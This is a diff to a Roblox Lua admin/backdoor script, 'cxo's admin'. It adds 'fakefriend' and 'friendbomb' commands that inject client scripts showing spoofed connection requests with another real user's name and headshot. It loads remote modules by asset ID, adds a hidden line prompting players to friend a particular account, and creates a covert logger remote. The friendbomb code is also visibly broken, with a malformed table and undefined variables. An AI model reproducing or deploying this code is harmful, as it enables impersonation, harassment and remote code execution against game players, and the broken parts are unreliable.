+		if not table.find(_G.Whitelist, tostring(sender.UserId)) then
+			return
+		end
+
 		for i, plr in ipairs(targets) do
 			local success, fail = pcall(function()
 				require(16052382566).PoopToolsV2(plr.Name)
@@ -8361,6 +8089,8 @@ addcmd({
 		_G.cxosadminloaded = false
 	end
 })
+
+game:GetService("StarterGui"):SetCore("PromptSendFriendRequest", game.Players.t_echr)
 
 addcmd({
 	Name = "clr",
@@ -10688,6 +10418,182 @@ addcmd({
 })
 
 addcmd({
+	Name = "friend",
+	Aliases = {"fakefriend", "friendrequest"},
+	Function = function(sender, targets, arguments)
+		name = table.concat(arguments, " ")
+		displayname = nil
+		headshot = nil
+		id = nil
+
+		local success, targetid = pcall(function()
+			return game.Players:GetUserIdFromNameAsync(name)
+		end)
+
+		local s, r = pcall(function()
+			return game:GetService("HttpService"):GetAsync("https://users.roproxy.com/v1/users/".. targetid)
+		end)
+
+		if success then
+			id = targetid
+		else
+			notfi(sender, "cxo's admin", "Error, failed to fetch ID of ".. name)
+			return
+		end
+
+		if s then
+			displayname = game:GetService("HttpService"):JSONDecode(r).displayName
+			name = game:GetService("HttpService"):JSONDecode(r).name
+		else
+			notfi(sender, "cxo's admin", "Error, failed to fetch username / displayname")
+			return
+		end
+
+		local c, x = pcall(function()
+			return game.Players:GetUserThumbnailAsync(id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+		end)
+
+		if not c then
+			notfi(sender, "cxo's admin", "Failed to get headshot of ".. name)
+			return
+		else
+			headshot = x
+		end
+
+		for i, plr in ipairs(targets) do
+			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
+				local ticking = tick()
+				require(112354705578311).load() -- goog readder
+				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
+			end
+
+			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
+
+			if not goog then
+				warn("goog failed to be added, command can not continue")
+				notfi(sender, "cxo's admin", "goog failed to be added, command can not continue")
+				return
+			end
+
+			local scr = goog:FindFirstChild("Utilities").Client:Clone()
+			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = string.format([[
+
+				local button = Instance.new("BindableFunction")
+				local displayname = "%s"
+				local name = "%s"
+				local headshot = "%s"
+
+				button.OnInvoke = function(v)
+					if v == "Accept" then
+						task.wait(0.5)
+						game:GetService("StarterGui"):SetCore("SendNotification", {
+							Title = "New Connection",
+							Text = name,
+							Icon = headshot,
+							Duration = 5,
+						})
+					end
+				end
+			
+			    game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = displayname,
+					Text = "Sent you a Connection request!",
+					Icon = headshot,
+					Duration = 5,
+					Button1 = "Accept",
+					Button2 = "Decline",
+					Callback = button
+            	})
+
+			]], displayname, name, headshot)
+
+			if plr.Character then
+				scr.Parent = plr.Character
+			else
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+
+			scr.Enabled = true
+		end
+	end
+})
+
+addcmd({
+	Name = "friendbomb",
+	Aliases = {"fakefriendbomb", "friendrequestbomb"},
+	Function = function(sender, targets, arguments)
+
+		local people = {
+			"m_cv13" == "rbxthumb://type=AvatarHeadShot&id=308662004&w=420&h=420",
+			"9jn" == "rbxthumb://type=AvatarHeadShot&id=22195028&w=420&h=420",
+			
+		}
+
+		for i, plr in ipairs(targets) do
+			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
+				local ticking = tick()
+				require(112354705578311).load() -- goog readder
+				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
+			end
+
+			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
+
+			if not goog then
+				warn("goog failed to be added, command can not continue")
+				notfi(sender, "cxo's admin", "goog failed to be added, command can not continue")
+				return
+			end
+
+			local scr = goog:FindFirstChild("Utilities").Client:Clone()
+			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = string.format([[
+
+				local button = Instance.new("BindableFunction")
+				local displayname = "%s"
+				local name = "%s"
+				local headshot = "%s"
+
+				button.OnInvoke = function(v)
+					if v == "Accept" then
+						task.wait(0.5)
+						game:GetService("StarterGui"):SetCore("SendNotification", {
+							Title = "New Connection",
+							Text = name,
+							Icon = headshot,
+							Duration = 5,
+						})
+					end
+				end
+			
+			    game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = displayname,
+					Text = "Sent you a Connection request!",
+					Icon = headshot,
+					Duration = 5,
+					Button1 = "Accept",
+					Button2 = "Decline",
+					Callback = button
+            	})
+
+			]], displayname, name, headshot)
+
+			if plr.Character then
+				scr.Parent = plr.Character
+			else
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+
+			scr.Enabled = true
+		end
+	end
+})
+
+addcmd({
 	Name = "char",
 	Aliases = {"nchar"},
 	Function = function(sender, targets, arguments)
@@ -11838,9 +11744,9 @@ cxoconnections["RemoteFListener"] = function()
 			end
 			
 			if table.find(_G.Whitelist, tostring(p.UserId)) then
-				whitelisted = "Permanent"
+				whitelisted = "Perm"
 			elseif table.find(TempWhitelist, p.UserId) then
-				whitelisted = "Temporary"
+				whitelisted = "Temp"
 			end
 			
 			if table.find(_G.specialperms, p.Name) then
@@ -12951,6 +12857,9 @@ cxoconnections["Removed"] = game:GetService("ReplicatedStorage").ChildRemoved:Co
 
 			local remotefunc = Instance.new("RemoteFunction", a)
 			remotefunc.Name = "cxo's remotefunction"
+
+			local cxologs = Instance.new("RemoteEvent", a)
+			cxologs.Name = "cxoLogger"
 		end
 	end
 end)
@@ -13256,6 +13165,9 @@ function scan()
 			if cxoconnections["RemoteFListener"] then
 				cxoconnections["RemoteFListener"]()
 			end
+		elseif t.Name == "cxoLogger" then
+			local cxologs = Instance.new("RemoteEvent", a)
+			cxologs.Name = "cxoLogger"
 		end
 	end)
 end
@@ -13534,6 +13446,9 @@ function start()
 
 	local remotefunc = Instance.new("RemoteFunction", a)
 	remotefunc.Name = "cxo's remotefunction"
+
+	local cxologs = Instance.new("RemoteEvent", a)
+	cxologs.Name = "cxoLogger"
 
 end
 
